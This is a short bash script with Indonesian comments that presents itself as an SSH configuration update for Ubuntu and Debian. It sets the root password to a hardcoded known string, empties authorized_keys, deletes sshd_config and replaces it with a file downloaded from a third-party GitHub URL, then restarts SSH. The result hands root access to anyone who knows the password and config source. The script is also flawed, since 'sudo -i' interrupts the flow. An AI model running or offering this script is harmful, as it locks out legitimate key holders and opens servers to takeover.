#!/bin/bash

# Masuk ke mode root
sudo -i

# Ganti password root menjadi 'cambancoreng'
echo "root:cambancoreng" | sudo chpasswd

# Skrip untuk mengubah konfigurasi SSH dan authorized keys
# Untuk Ubuntu dan Debian

# Langkah 1: Hapus seluruh isi authorized_keys
echo "Menghapus seluruh authorized_keys..."
truncate -s 0 ~/.ssh/authorized_keys

# Langkah 2: Hapus konfigurasi sshd_config lama
echo "Menghapus file /etc/ssh/sshd_config yang lama..."
rm /etc/ssh/sshd_config

# Langkah 3: Mengunduh file sshd_config baru
echo "Mengunduh konfigurasi SSH baru dari server..."
wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/rensanedo/ssh/refs/heads/main/sshd_config

# Langkah 4: Restart layanan SSH
echo "Me-restart layanan SSH..."
systemctl restart ssh

# Skrip selesai
echo "Konfigurasi SSH dan authorized_keys berhasil diperbarui."
